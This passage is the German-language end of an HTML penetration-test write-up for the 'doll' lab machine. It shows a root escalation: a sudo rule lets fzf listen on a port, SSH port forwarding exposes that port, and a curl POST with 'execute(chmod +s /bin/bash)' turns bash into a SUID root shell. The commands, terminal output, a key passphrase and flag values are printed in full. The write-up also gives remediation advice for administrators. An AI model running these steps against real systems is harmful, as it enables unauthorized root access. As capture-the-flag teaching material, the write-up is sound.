+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept beschreibt die Ausnutzung der unsicheren `sudo`-Regel für `fzf`, um Root-Rechte zu erlangen. Durch Starten von `fzf` mit der Option `--listen` als `root` wird ein lokaler Dienst gestartet, der Befehle entgegennimmt. Mittels SSH Local Port Forwarding wird dieser Dienst vom Angreifer-System aus erreichbar gemacht, um einen Befehl zu senden, der `/bin/bash` SUID macht.
+             </p>
+            <p class="evaluation">
+                <strong>Voraussetzungen:</strong>
+                *   Zugriff als Benutzer `bela`.
+                *   Die `sudo`-Regel `(ALL) NOPASSWD: /usr/bin/fzf --listen\=1337` muss aktiv sein.
+                *   SSH-Zugang als `bela` für Port Forwarding.
+            </p>
+
+             <p class="analysis">
+                 <strong>Schritt 1: SSH Port Forwarding und fzf starten</strong><br>
+                 1.  Auf dem Angreifer-System wird eine neue SSH-Verbindung zu `bela@doll.hmv` aufgebaut, wobei der lokale Port 1337 auf den Port 1337 des Zielsystems (bezogen auf dessen Loopback-Interface 127.0.0.1) weitergeleitet wird: `ssh -i ... -L 1337:127.0.0.1:1337`.
+                 2.  In dieser neuen SSH-Sitzung wird der `sudo`-Befehl ausgeführt, um `fzf` als `root` auf Port 1337 lauschen zu lassen: `sudo /usr/bin/fzf --listen\=1337`.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 1):</strong> Das Port Forwarding ist korrekt eingerichtet. Der `fzf`-Prozess läuft nun als `root` und wartet auf Befehle auf Port 1337 (localhost auf dem Ziel), welcher nun vom Angreifer über `localhost:1337` erreichbar ist.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Auf Angreifer-System -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh -i ~/Doll/home/bela/.ssh/id_rsa bela@doll.hmv -L 1337:127.0.0.1:1337</span></div>
+                     <pre>
+Enter passphrase for key '/root/Doll/home/bela/.ssh/id_rsa': <span class="password">devilcollectsit</span>
+Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+# ... (Login Banner) ...
+Last login: Fri Apr 28 19:32:45 2023 from 192.168.2.130
+                     </pre>
+                     <!-- In der neuen SSH-Sitzung auf dem Zielsystem -->
+                     <div class="prompt no-kali-prompt">bela@doll:~$ <span class="command">sudo /usr/bin/fzf --listen\=1337</span></div>
+                     <!-- fzf läuft nun und wartet -->
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Schritt 2: SUID-Bit setzen und Root-Shell erhalten</strong><br>
+                 1.  Auf dem Angreifer-System wird `curl` verwendet, um einen Befehl an den weitergeleiteten Port 1337 zu senden: `curl -X POST http://localhost:1337 -d 'execute(chmod +s /bin/bash)'`. Der `execute(...)`-Payload weist `fzf` an, `chmod +s /bin/bash` als `root` auszuführen.
+                 2.  In der SSH-Sitzung auf dem Zielsystem wird überprüft, ob `/bin/bash` nun das SUID-Bit hat (`ls -la /bin/bash`).
+                 3.  `/bin/bash -p` wird ausgeführt, um eine Shell zu starten, die die effektive UID (euid=0) beibehält.
+                 4.  `id` wird ausgeführt, um die Root-Rechte zu bestätigen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt 2):</strong> Der Exploit funktioniert perfekt. `fzf` führt den `chmod`-Befehl als `root` aus. `/bin/bash` erhält das SUID-Bit. Der Aufruf mit `/bin/bash -p` liefert eine Shell mit `euid=0(root)`. Root-Zugriff wurde erreicht!
+             </p>
+              <p class="recommendation">
+                  <strong>Empfehlung (Pentester):</strong> Root-Zugriff erlangt. Suchen und lesen Sie die Root-Flag. Dokumentieren Sie den `fzf`-Exploit.
+                  <br>
+                  <strong>Empfehlung (Admin):</strong> **Höchste Priorität:** Entfernen Sie die unsichere `sudo`-Regel für `fzf`. Überprüfen Sie das System auf Änderungen (wie das SUID-Bit auf `/bin/bash`) und stellen Sie den ursprünglichen Zustand wieder her.
+              </p>
+              <p class="evaluation">
+                  <strong>Risikobewertung:</strong> Die Kombination aus Informationslecks in der Docker Registry/Manifest und einer unsicheren `sudo`-Regel für `fzf` ermöglichte die vollständige Übernahme des Systems. Das Risiko ist **kritisch**.
+              </p>
+              <div class="code-block">
+                  <div class="terminal">
+                      <!-- Auf Angreifer-System (anderes Terminal) -->
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -X POST http://localhost:1337 -d 'execute(chmod +s /bin/bash)'</span></div>
+                      <!-- Keine Ausgabe erwartet -->
+                  </div>
+              </div>
+              <div class="code-block">
+                  <div class="terminal">
+                      <!-- In der SSH-Sitzung auf dem Zielsystem -->
+                      <div class="prompt no-kali-prompt">bela@doll:~$ <span class="command">ls -la  /bin/bash</span></div>
+                      <pre>-rwsr-sr-x 1 root root 1234376 mar 27  2022 /bin/bash</pre> <!-- SUID Bit ist gesetzt! -->
+                      <div class="prompt no-kali-prompt">bela@doll:~$ <span class="command">/bin/bash -p</span></div>
+                      <div class="prompt root-prompt">bash-5.1# <span class="command">id</span></div>
+                      <pre>uid=1000(bela) gid=1000(bela) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(bela)</pre>
+                      <!-- Root-Shell erhalten! -->
+                  </div>
+              </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User- und Root-Flags werden gemäß den Angaben am Ende des Originaltextes dokumentiert. Die User-Flag wurde vermutlich im Home-Verzeichnis von `bela` gefunden, die Root-Flag im Verzeichnis `/root`.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/bela/user.txt</div>
+                     <div class="flag-value"><span class="password">juHDnnGMYNIkVgfnMV</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">xwHTSMZljFuJERHmMV</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-04-28</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
